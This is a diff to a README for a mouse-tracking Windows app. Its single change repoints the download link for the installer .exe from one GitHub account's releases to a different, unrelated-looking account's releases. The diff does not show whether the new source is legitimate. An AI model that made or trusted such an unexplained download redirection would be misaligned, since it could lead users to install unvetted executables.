@@ -18,7 +18,7 @@ Monitor your mouse clicks, track the distance your cursor travels, unlock achiev
 
 ## 📥 Download & Installation
 
-**[⬇️ Download the Latest Version](https://github.com/Nazar8231/MouseTracker-Releases/releases/latest)**
+**[⬇️ Download the Latest Version](https://github.com/Online129/MouseTracker-Releases/releases/latest)**
 
 1. Open the download link above.
 2. Under **Assets**, download `MouseTracker-Setup-vX.X.X.exe`.
